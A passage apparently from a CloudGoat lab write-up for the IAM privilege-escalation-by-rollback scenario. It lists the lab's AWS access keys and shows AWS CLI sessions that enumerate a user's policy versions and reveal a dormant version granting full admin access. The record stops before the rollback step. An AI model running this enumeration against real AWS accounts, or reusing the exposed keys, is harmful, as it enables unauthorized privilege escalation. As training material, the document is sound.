# iam_privesc_by_rollback

cloudgoat_output_aws_account_id = "127553332731"
cloudgoat_output_policy_arn = "arn:aws:iam::127553332731:policy/cg-raynor-policy-cgidmgbtqp9xv2"
cloudgoat_output_raynor_access_key_id = "AKIAR3MWFMX5XGDEQZXT"
cloudgoat_output_raynor_secret_key = "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"
cloudgoat_output_username = "raynor-cgidmgbtqp9xv2"

```shell-session
╭─zoey@parrot-virtual ~/sec/cloudgoat/cloudgoat ‹master*› 
╰─$ aws iam list-attached-user-policies --user-name raynor-cgidmgbtqp9xv2 --profile cg-raynor               
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-raynor-policy-cgidmgbtqp9xv2",
            "PolicyArn": "arn:aws:iam::127553332731:policy/cg-raynor-policy-cgidmgbtqp9xv2"
        }
    ]
}
```

```shell-session
╭─zoey@parrot-virtual ~/sec/cloudgoat/cloudgoat ‹master*› 
╰─$ aws iam list-policy-versions --policy-arn arn:aws:iam::127553332731:policy/cg-raynor-policy-cgidmgbtqp9xv2 --profile cg-raynor
{
    "Versions": [
        {
            "VersionId": "v5",
            "IsDefaultVersion": false,
            "CreateDate": "2021-02-16T01:28:35+00:00"
        },
        {
            "VersionId": "v4",
            "IsDefaultVersion": false,
            "CreateDate": "2021-02-16T01:28:35+00:00"
        },
        {
            "VersionId": "v3",
            "IsDefaultVersion": false,
            "CreateDate": "2021-02-16T01:28:35+00:00"
        },
        {
            "VersionId": "v2",
            "IsDefaultVersion": false,
            "CreateDate": "2021-02-16T01:28:35+00:00"
        },
        {
            "VersionId": "v1",
            "IsDefaultVersion": true,
            "CreateDate": "2021-02-16T01:28:34+00:00"
        }
    ]
}
```

```
╭─zoey@parrot-virtual ~/sec/cloudgoat/cloudgoat ‹master*› 
╰─$ aws iam get-policy-version --policy-arn arn:aws:iam::127553332731:policy/cg-raynor-policy-cgidmgbtqp9xv2 --profile cg-raynor --version-id v2
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": "*",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": false,
        "CreateDate": "2021-02-16T01:28:35+00:00"
    }
}
```